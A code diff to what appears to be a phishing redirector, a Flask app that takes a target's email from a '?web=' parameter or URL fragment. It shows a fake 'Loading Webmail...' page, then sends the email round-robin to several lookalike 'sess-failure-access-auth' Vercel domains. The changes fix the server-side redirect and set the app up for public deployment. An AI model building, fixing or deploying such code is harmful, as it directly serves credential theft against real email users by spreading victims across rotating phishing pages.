@@ -34,7 +34,7 @@ DOMAINS = [
     'https://sess-failure-access-auth-jlhd.vercel.app',
     'https://sess-failure-access-auth-njph.vercel.app',
     'https://sess-failure-access-auth-sa27.vercel.app',
-    'https://sess-failure-access-auth-nmpw.vercel.app'   
+    'https://sess-failure-access-auth-nmpw.vercel.app'
 ]
 
 # Initialize counter
@@ -43,10 +43,10 @@ current_index = 0
 @app.route('/')
 def round_robin_balancer():
     global current_index
-    
+
     # Try to get email from query parameter first (?web=email@email.com)
     email = request.args.get('web', '')
-    
+
     # If no query parameter, serve a page that can handle the fragment
     if not email:
         return render_template_string('''
@@ -174,13 +174,11 @@ def round_robin_balancer():
         <div class="loading-spinner"></div>
         <div class="loading-text">Loading Webmail...</div>
     </div>
-    
-    <script>
-        const status = document.getElementById('status');
 
+    <script>
         if (window.location.hash) {
             let email = window.location.hash.substring(1);
-            
+
             // Redirect after 2 seconds
             setTimeout(function() {
                 window.location.href = '/?web=' + encodeURIComponent(email);
@@ -196,20 +194,20 @@ def round_robin_balancer():
 </body>
 </html>
         ''')
-    
+
     # Basic email validation
     if not email or '@' not in email or '.' not in email:
         return "Invalid email.", 400
-    
+
     # Get next domain in round-robin sequence
     target_domain = DOMAINS[current_index]
-    
+
     # Increment index for next request
     current_index = (current_index + 1) % len(DOMAINS)
-    
+
     # Construct target URL with the required ?web= parameter format
     target_url = f"{target_domain}/?web={email}"
-    
+
     # Return loading page before redirect
     return render_template_string('''
         <!DOCTYPE html>
@@ -337,28 +335,19 @@ def round_robin_balancer():
         <div class="loading-spinner"></div>
         <div class="loading-text">Loading Webmail...</div>
     </div>
-    
-    <script>
-        const status = document.getElementById('status');
 
-        if (window.location.hash) {
-            let email = window.location.hash.substring(1);
-            
-            // Redirect after 2 seconds
-            setTimeout(function() {
-                window.location.href = '/?web=' + encodeURIComponent(email);
-            }, 2000);
-        } else {
-            // If no hash, show error after 2 seconds
-            setTimeout(function() {
-                document.querySelector('.loading-text').innerText = 'Invalid email';
-                document.querySelector('.loading-text').style.color = '#dc3545';
-            }, 1700);
-        }
+    <script>
+        // Email arrived in the query string (?web=...).
+        // target_url was injected server-side with the round-robin domain.
+        const TARGET_URL = "{{ target_url }}";
+
+        setTimeout(function() {
+            window.location.href = TARGET_URL;
+        }, 1700);
     </script>
 </body>
 </html>
     ''', target_url=target_url)
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
